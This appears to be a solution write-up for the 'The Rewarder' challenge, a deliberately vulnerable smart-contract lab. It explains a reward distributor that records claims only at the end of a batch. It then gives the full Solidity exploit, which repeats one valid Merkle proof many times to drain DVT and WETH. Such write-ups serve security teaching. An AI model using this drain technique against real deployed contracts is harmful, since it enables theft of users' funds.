# The Rewarder

A contract is distributing rewards of Damn Valuable Tokens and WETH.

To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.

Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.

Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.


Let me break down this solution step by step to help you understand it clearly.

1. First, let's understand the vulnerability:
```solidity
// Inside claimRewards function
for (uint256 i = 0; i < inputClaims.length; i++) {
    // ... other code ...

    // This is the key vulnerability - marks claims as used only at the end
    if (i == inputClaims.length - 1) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
    }
}
```

The critical flaw is that the contract only marks claims as "used" at the very end of processing all claims in the array. This means we can submit multiple valid claims in one transaction, and they'll all process before any are marked as used.

2. Understanding the player's valid claim amounts:
```solidity
uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;  // Amount player can legitimately claim of DVT
uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;  // Amount player can legitimately claim of WETH
```

3. Calculating how many times we can repeat the claims:
```solidity
uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;
uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;
uint totalTxCount = dvtTxCount + wethTxCount;
```
This calculates how many times we need to repeat the claim to drain the entire contract.

4. Setting up the tokens array:
```solidity
IERC20[] memory tokensToClaim = new IERC20[](2);
tokensToClaim[0] = IERC20(address(dvt));  // DVT token
tokensToClaim[1] = IERC20(address(weth)); // WETH token
```

5. Creating the exploit claims array:
```solidity
Claim[] memory claims = new Claim[](totalTxCount);

for (uint i = 0; i < totalTxCount; i++) {
    if (i < dvtTxCount) {
        // Create DVT claims
        claims[i] = Claim({
            batchNumber: 0,
            amount: PLAYER_DVT_CLAIM_AMOUNT,
            tokenIndex: 0,
            proof: merkle.getProof(dvtLeaves, 188) // Player's index is 188
        });
    } else {
        // Create WETH claims
        claims[i] = Claim({
            batchNumber: 0,
            amount: PLAYER_WETH_CLAIM_AMOUNT,
            tokenIndex: 1,
            proof: merkle.getProof(wethLeaves, 188) // Player's index is 188
        });
    }
}
```
This creates an array where we repeat the same valid claim multiple times:
- First part of array: Multiple DVT claims
- Second part of array: Multiple WETH claims
- Each claim uses the same valid Merkle proof for player (index 188)

6. Executing the exploit:
```solidity
distributor.claimRewards({
    inputClaims: claims,
    inputTokens: tokensToClaim
});
```
When this executes:
1. All claims are processed in sequence
2. Each claim passes the Merkle proof check (they're valid claims)
3. The contract transfers tokens for each claim
4. Only at the very end does it try to mark claims as used
5. By then, we've already received all the tokens!

7. Finally, transfer to recovery:
```solidity
dvt.transfer(recovery, dvt.balanceOf(player));
weth.transfer(recovery, weth.balanceOf(player));
```

The key insight is:
- We only need one valid claim proof
- We can repeat this valid claim many times in a single transaction
- The contract transfers tokens before marking claims as used
- Therefore, we can drain the contract using just one valid claim repeated many times


